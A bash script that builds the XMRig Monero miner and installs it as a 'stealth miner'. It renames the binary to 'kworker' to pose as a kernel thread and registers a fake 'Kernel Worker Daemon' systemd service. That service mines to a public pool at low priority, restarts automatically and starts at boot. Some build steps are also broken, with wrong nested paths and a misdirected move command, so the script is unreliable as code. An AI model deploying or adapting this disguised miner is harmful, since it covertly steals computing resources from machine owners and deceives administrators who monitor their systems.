#!/bin/bash

set -e  # Exit on error

echo "🔧 Setting up Monero stealth miner..."

# Check if running with sudo
if [[ "$EUID" -ne 0 ]]; then
  echo "❌ Please run this script using sudo:"
  echo "   sudo $0"
  exit 1
fi

# 1. Update system and install dependencies
sudo apt update && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev

# 2. Clone XMRig
if [ -d "xmrig" ]; then
  echo "📁 'xmrig' folder exists. Removing it..."
  rm -rf xmrig
fi

git clone https://github.com/xmrig/xmrig.git
cd xmrig || exit 1

# 3. Build XMRig
mkdir xmrig/build && cd xmrig/build
cmake .. && make -j$(nproc)
cd ../..

# 4. Ask for wallet address
read -rp "🔑 Enter your Monero wallet address: " WALLET

# 5. Move and rename the miner binary
mv ./xmrig /usr/local/bin/kworker
chmod +x /usr/local/bin/kworker

# 6. Create a fake systemd service
echo "📦 Creating fake systemd service..."

cat <<EOF > /etc/systemd/system/system-kd.service
[Unit]
Description=Kernel Worker Daemon
After=network.target

[Service]
ExecStart=/usr/local/bin/kworker -o pool.supportxmr.com:443 -u ${WALLET} -k --tls
Restart=always
Nice=10
CPUWeight=10
IOWeight=10

[Install]
WantedBy=multi-user.target
EOF

# 7. Reload, enable and start the service
systemctl daemon-reexec
systemctl daemon-reload
systemctl enable system-kd
systemctl start system-kd

echo "✅ Monero miner running stealthily as 'system-kd.service'."
echo "🔍 Check status: sudo systemctl status system-kd"
echo "🛑 Stop miner:   sudo systemctl stop system-kd"
